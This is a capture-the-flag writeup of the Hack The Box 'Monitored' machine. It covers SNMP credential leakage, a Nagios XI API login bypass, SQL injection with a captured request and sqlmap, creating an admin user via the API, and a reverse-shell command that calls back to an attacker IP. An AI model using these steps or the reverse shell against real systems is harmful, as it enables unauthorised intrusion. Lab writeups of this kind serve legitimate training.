+++
date = '2026-08-17T14:16:23+02:00'
draft = false
title = 'Monitored Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`09/03/2025`**

![pwn.jpeg](/images/imgs_monitored/pwn.jpeg)

---
# Introduction

**_Monitored_** is a challenging **Medium-level Linux** box on **Hack The Box** that focuses heavily on manual web exploitation.

The initial foothold requires chaining multiple steps: performing **SNMP** enumeration to uncover internal scripts, abusing a **Nagios XI API** endpoint to bypass authentication, and exploiting a **SQL Injection** (**CVE-2023-40931**) to extract administrative API keys.

From there, we escalate privileges to an administrator within the web application by interacting with the backend API, allowing us to gain **Remote Code Execution** through malicious check commands. Finally, the box presents a fantastic playground to achieve **root** either by abusing multiple sudo misconfigurations or by leveraging a modern **Copy-Fail** vulnerability (**CVE-2026-31431**).

---
# Techniques Used

- **SNMP Data Extraction**

- **API Authentication Bypass**

- **SQL Injection (CVE-2023-40931)**

- **API Abuse for Privilege Escalation**

- **Sudo Misconfigurations / CVE-2026-31431 (Copy-Fail)**

---
# Enumeration
## nmap

Initial scan on all ports:

```bash
nmap -p- monitored
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknown
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV monitored
```

```text
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http     Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp  open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http Apache httpd 2.4.56
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
Service Info: Hosts: nagios.monitored.htb, 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:

- **22**/tcp - SSH

- **80**/tcp - HTTP (Redirects to HTTPS)

- **389**/tcp - LDAP

- **443**/tcp - HTTPS (Nagios XI)

Based on the SSL certificate, I added **`nagios.monitored.htb`** to my **`/etc/hosts`** file.

## HTTP & LDAP Enumeration

I started my enumeration from the web server. Browsing to it immediately redirected me to a **Nagios XI** login page.

![web1.png](/images/imgs_monitored/web1.png)

Since I didn't have any credentials, I searched for default passwords, but **Nagios XI** doesn't have a standard one. However, I still tried the classic combinations like **`nagiosadmin:nagiosxi`** and **`root:nagiosxi`**, without any luck.

![web2.png](/images/imgs_monitored/web2.png)

I fired up **searchsploit** to look for known CVEs affecting **Nagios XI**, but I couldn't find anything immediately exploitable without an initial foothold or version number.
Moving on, I tried enumerating the **LDAP** service on port **389** using **ldapsearch**, but I wasn't able to retrieve anything useful.

At this point, I went back to the **Nagios** instance. I dug deeper into CVEs, ran a **Gobuster** directory brute-force in the background, but still found absolutely nothing.
Being completely stuck on the **TCP** side, I decided to broaden my perspective and run a **UDP** port scan.

## UDP Enumeration

```bash
nmap -sU -p 161,162,500,4500 -sV --min-rate 200 --max-retries 2 monitored
```

```text
PORT     STATE  SERVICE   VERSION
161/udp  open   snmp      SNMPv1 server; net-snmp SNMPv3 server (public)
162/udp  open   snmp      net-snmp
500/udp  closed isakmp
4500/udp closed nat-t-ike
```

The presence of SNMP on port 161 with a public community string was exactly the breakthrough I needed.

---
# Initial Access | SNMP to SQLi

# Analyzing Error Messages & API Discovery

By querying the **SNMP** service using **snmpwalk**, I was able to extract a highly sensitive string related to a running process:

```bash
snmpwalk -v 2c -c public monitored
```

![snmp1.png](/images/imgs_monitored/snmp1.png)

This revealed a potential user (**svc**) and what looked like a password or token (**`XjH7VCehowpR1xZB`**).

![snmp2.png](/images/imgs_monitored/snmp2.png)

My first thought was to use them for **SSH**, but the login failed.

![ssh_fail.png](/images/imgs_monitored/ssh_fail.png)

I went back to the **Nagios XI** web panel and tried logging in. While I couldn't get in, I noticed that the application error messages changed depending on the input:

```text
# Using svc:password
Invalid username or password.

# Using svc:XjH7VCehowpR1xZB
The specified user account has been disabled or does not exist.
```

![error_change.png](/images/imgs_monitored/error_change.png)

This discrepancy was a huge hint: the credentials were valid, but the user **svc** was either disabled or restricted from accessing the web UI.

Since I was stuck again, I went back to **searchsploit** and started analyzing the **Nagios XI** exploits one by one. Eventually, I found a specific **SQL Injection** exploit that targeted an **API endpoint**: **`nagiosxi/api/v1/authenticate`**.

![sql1.png](/images/imgs_monitored/sql1.png)

I fired up Burpsuite to test this endpoint manually. As soon as I sent a request to **http://nagios.monitored.htb/nagiosxi/api/v1/authenticate** using the **svc** credentials, the server responded with a valid authentication token: **`761a24b4b2c9b8699ff0d9d560f8e64e0d882a33`**.

![sql2.png](/images/imgs_monitored/sql2.png)

According to the exploit's logic, I could bypass the login entirely by appending this token directly to the URL:
- **http://nagios.monitored.htb/nagiosxi/login.php?token=761a24b4b2c9b8699ff0d9d560f8e64e0d882a33**

![sql3.png](/images/imgs_monitored/sql3.png)

I successfully logged into the website.

![web_logged.png](/images/imgs_monitored/web_logged.png)

## Exploiting SQL Injection (CVE-2023-40931)

Once inside, I identified the **Nagios XI** version as **`5.11.0`**.

![version.png](/images/imgs_monitored/version.png)

A quick search revealed this version is vulnerable to **CVE-2023-40931**, an authenticated **SQL Injection** within the **banner_message-ajaxhelper.php** endpoint.

I captured the following **POST** request with **Burpsuite**

```text
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=dkocce8s3jktgros1bbhnme7rh
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

action=acknowledge_banner_message&id=*
```

The server responded with a syntax error, confirming the injection point:

![sql4.png](/images/imgs_monitored/sql4.png)

I saved the request to a file (**`req.req`**) and fed it to **sqlmap**. 
While waiting for the time-based attack to process, I researched the database structure. By default, it stores users in the **`xi_users`** table inside the **`nagiosxi`** DB. To speed up the tool, I explicitly targeted those fields:

```bash
sqlmap -r req.req --dbms mysql -D nagiosxi -T xi_users --dump --batch --force-ssl
```

![sql5.png](/images/imgs_monitored/sql5.png)

The dump provided several password hashes and **API keys**. 
I tried cracking the hashes but failed, leaving me temporarily stuck again. I had an **API key**, but no immediate way to use it.

![sql6.png](/images/imgs_monitored/sql6.png)

I took a step back, reviewed the entire process, and analyzed another exploit script (**`Nagios XI Version 2024R1.01 - multiple/webapps/51925.py`**).

![scsploit1.png](/images/imgs_monitored/scsploit1.png)

---
# Lateral Movement | API Abuse to RCE

By studying the logic of that exploit, I learned that a valid **API key** could be used to interact with the backend and provision a brand-new user with administrative privileges.

## The API Technique

The endpoint **`/nagiosxi/api/v1/system/user`** allows authorized users to create accounts. By appending the extracted **API key** (**`IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`**), we can send a **POST** request with the parameter **`auth_level=admin`** to elevate the new user.

![sql7.png](/images/imgs_monitored/sql7.png)

After logging into the platform with **`fallingstr:Stars1%`**, I had full administrative control.

![logged_as_new.png](/images/imgs_monitored/logged_as_new.png)

To achieve **Remote Code Execution**, the exploit creates a malicious command to gain a reverse shell. I reproduced it manually:

**`1.`** **Navigated to: Configure -> Advanced Configuration -> Commands -> Add New**.

**`2.`** **Created a command named fall with the following Command Line payload**:
    **`bash -c 'bash -i >& /dev/tcp/10.10.15.152/22667 0>&1'`**

![initial1.png](/images/imgs_monitored/initial1.png)

**`3.`** **Navigated to: Configure --> Advanced Configuration --> Services --> Add New --> Check Command (fall)**.

![inital2.png](/images/imgs_monitored/inital2.png)

**`4.`** **Clicked Run Check Command**.

My **netcat** listener immediately caught a reverse shell as the **nagios** user, and I grabbed the **user flag**.

![userf.png](/images/imgs_monitored/userf.png)

---
# Privilege Escalation | CVE-2026-31431 (Copy-Fail)

After transferring and executing **`linpeas.sh`**, I discovered multiple paths to escalate privileges.

## The Intended Path (Sudo Rules)

If you run **`sudo -l`**, the **nagios** user possesses a lot of **sudo privileges**. Analyzing all the scripts one by one reveals several privilege escalation vectors like: **wildcard expansion**, **path hijacking**, or **overwriting the nagios binary with reverse shell code/RSA key leaks**.

![sudol.png](/images/imgs_monitored/sudol.png)

## The Modern Path (CVE-2026-31431)

However, **LinPEAS** also flagged the system as vulnerable to **CVE-2026-31431**, known as "**Copy Fail**".

![vuln.png](/images/imgs_monitored/vuln.png)

**Note**: _This modern vulnerability exploits improper permission handling and race conditions during specific copy operations. It allows a low-privileged user to abuse system utilities to overwrite sensitive files (like /etc/shadow) or hijack privileged execution paths._

Since I had never tried it before, I chose this route to take over the system. I cloned the [PoC repository](https://github.com/Juguitos/copy-fail), transferred the python script, made it executable, and ran it:

![rootf.png](/images/imgs_monitored/rootf.png)

The script successfully abused the flawed copy logic, granting me a **root** shell.

---
# Final Thoughts

I'm not a big fan of this machine... especially because of the foothold. I found the **SQL Injection** routing such a brainfuck. It feels like "**Hard**" difficulty at least.

Some people suggest this machine for **OSCP** preparation. Indeed it is, because its exploitation path is almost entirely manual. But I don't think **OSCP** goes in-depth into manual **SQL injection**. Maybe I say this because I wasn't able to exploit the **SQLi** manually and had to rely on **sqlmap**.

Overall, a great box. It made me think about a lot of different ideas and possible attack paths, and it took me a lot to pwn. It also provided me with a great playground to try the recent **Copy-Fail** CVE in a controlled environment.

**Sources**:

- **Nagios XI CVE-2023-40931 Deep Dive | https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c**

- **Copy-Fail (CVE-2026-31431) Exploit | https://github.com/Juguitos/copy-fail**